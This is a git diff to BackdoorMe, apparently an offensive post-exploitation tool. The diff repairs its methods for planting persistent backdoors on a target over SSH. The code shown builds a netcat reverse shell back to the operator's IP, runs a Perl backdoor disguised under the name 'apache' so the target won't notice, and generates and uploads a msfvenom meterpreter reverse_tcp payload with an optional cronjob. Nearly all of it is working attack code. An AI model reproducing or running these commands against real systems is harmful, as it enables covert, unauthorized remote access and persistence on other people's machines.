@@ -86,7 +86,7 @@ class BackdoorMe(cmd.Cmd):
         print("Initializing backdoor...")
         self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S rm /tmp/f;")
         self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S mkfifo /tmp/f;")
-        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.localIP + " 53920 > sudo nohup /tmp/f")
+        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.localIP + " 53920 > sudo nohup /tmp/f &")
         print(GOOD + "Netcat backdoor on port 53920 attempted.")
 
     def do_perl(self,args):
@@ -111,9 +111,9 @@ class BackdoorMe(cmd.Cmd):
         fileToWrite.close()
 
         raw_input("Run the following command: nc -v -n -l -p 53921 in another shell to start the listener.")
-        scpFiles('perl/prsA.pl', False)
+        self.curtarget.scpFiles(self, 'perl/prsA.pl', False)
         print("Moving the backdoor script.")
-        self.curtarget.ssh.exec_command("echo " + pword + " | sudo -S nohup perl prsA.pl")
+        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup perl prsA.pl")
         print("Perl backdoor on port 53921 attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop.")
 
 
@@ -166,7 +166,7 @@ class BackdoorMe(cmd.Cmd):
         cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')
         #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
         os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f elf X -o initd" % self.localIP)
-        self.curtarget.scpFiles('initd', False)
+        self.curtarget.scpFiles(self, 'initd', False)
         print("Backdoor script moved")
         self.curtarget.ssh.exec_command("chmod +x initd")
         if cron:
